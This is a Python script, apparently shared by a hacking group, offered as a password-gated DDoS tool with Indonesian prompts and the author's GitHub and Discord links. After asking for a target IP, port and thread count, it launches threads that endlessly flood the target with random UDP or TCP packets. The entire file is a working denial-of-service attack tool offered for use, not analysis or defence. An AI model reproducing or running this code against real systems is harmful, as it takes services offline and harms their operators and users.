#!/usr/bin/env python3
#Code By ZX
#DONT ABUSE TOOL
import time
import random
import socket
import threading
import os

os.system("clear")
password ="ZeeX"

for i in range(3):
	pwd = input("[▪] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[▪] Wait 5 Seconds To Start DDOS!!! ")
		break
	else:
		time.sleep(5)
		print("[×] Password Salah!!! ")
		continue
time.sleep(5)
print("{√} Password Benar")
time.sleep(5)

print("""\033[92m

   _____        __  __     ____
 |__  /___  ___\ \/ /   _|__  /
   / // _ \/ _ \\  / | | | / / 
  / /|  __/  __//  \ |_| |/ /_ 
 /____\___|\___/_/\_\__, /____|
                    |___/      
                          """)
print("=============================================")
print(" | AUTHOR : ZeeXyZ")
print(" | GITHUB : https://github.com/ZeeXyzZ/Ddos")
print(" | DISCORD : ! ZeeXyZ#3072                  ")
print(" | MY TEAM : https://discord.gg/uGpDHvau5A")
print("=============================================")
ip = str(input(" IP TARGET:"))
port = int(input(" PORT:"))
choice = str(input(" GAS DDOS?(y/n):"))
times = int(input(" PACKET:"))
threads = int(input(" ISI PACKET:"))
def run():
    data = random._urandom((615))
    i = random.choice(("[TOK!!! TOK!!!]","[TOK!!! TOK!!!]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" PERMISI PAKET!!!")
        except:
            print("[#] SERVER IS DOWN!!!")

def run2():
    data = random._urandom(615)
    i = random.choice(("[TOK!!! TOK!!!]","[TOK!!! TOK!!!]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" PERMISI PAKET!!!")
        except:
            s.close()
            print("[#] SERVER IS DOWN!!!")
        
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()